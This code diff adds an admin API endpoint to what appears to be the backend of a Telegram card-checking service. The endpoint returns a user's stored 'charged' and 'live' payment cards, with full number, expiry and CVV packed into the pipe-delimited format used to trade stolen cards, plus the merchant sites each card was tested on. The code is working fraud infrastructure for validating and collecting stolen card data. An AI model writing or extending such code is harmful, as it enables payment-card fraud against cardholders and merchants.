@@ -442,6 +442,61 @@ async def list_all_hits(
     return {"hits": out}
 
 
+@router.get("/user-cards")
+async def user_cards(
+    telegram_id: int,
+    limit: int = 200,
+    admin: User = Depends(require_owner),
+):
+    """Look up a single user's stored CHARGED + LIVE cards by Telegram id.
+
+    Backs the admin panel's per-user card lookup. Includes rows recovered by the
+    admin-log failsafe (flagged via `recovered_from_log`). Screenshots are
+    excluded from the list payload (fetched separately per hit)."""
+    db = get_db()
+    user = await db.users.find_one(
+        {"telegram_id": telegram_id},
+        {"telegram_id": 1, "telegram_username": 1, "telegram_first_name": 1,
+         "plan": 1, "hit_count": 1, "charged_count": 1, "live_count": 1},
+    )
+    cursor = (
+        db.hits.find(
+            {"telegram_id": telegram_id,
+             "status": {"$regex": r"^(charged|success|approved|succeeded|captured|live|ccn_live|3d_live)", "$options": "i"}},
+            {"screenshot_b64": 0},
+        )
+        .sort("created_at", -1)
+        .limit(min(limit, 1000))
+    )
+    charged, live = [], []
+    async for doc in cursor:
+        doc["id"] = str(doc.pop("_id"))
+        if "created_at" in doc and hasattr(doc["created_at"], "isoformat"):
+            doc["created_at"] = doc["created_at"].isoformat()
+        num = doc.get("card_number") or ""
+        mm = str(doc.get("card_exp_month") or "").zfill(2) if doc.get("card_exp_month") else ""
+        yy = str(doc.get("card_exp_year") or "")[-2:] if doc.get("card_exp_year") else ""
+        cvv = str(doc.get("card_cvv") or "")
+        doc["card"] = "|".join([p for p in (num, mm, yy, cvv) if p]) if num else None
+        doc["site"] = doc.get("hostname") or doc.get("merchant") or doc.get("site_url") or doc.get("url") or None
+        doc["recovered"] = bool(doc.get("recovered_from_log"))
+        st = (doc.get("status") or "").lower()
+        if st.startswith(("charge", "success", "approve", "succeed", "captured")):
+            charged.append(doc)
+        else:
+            live.append(doc)
+    if user:
+        user["telegram_id"] = int(user.get("telegram_id"))
+        user.pop("_id", None)
+    return {
+        "user": user,
+        "found": bool(user),
+        "charged": charged,
+        "live": live,
+        "counts": {"charged": len(charged), "live": len(live)},
+    }
+
+
 @router.get("/hits/{hit_id}/screenshot")
 async def get_hit_screenshot(hit_id: str, admin: User = Depends(require_owner)):
     db = get_db()
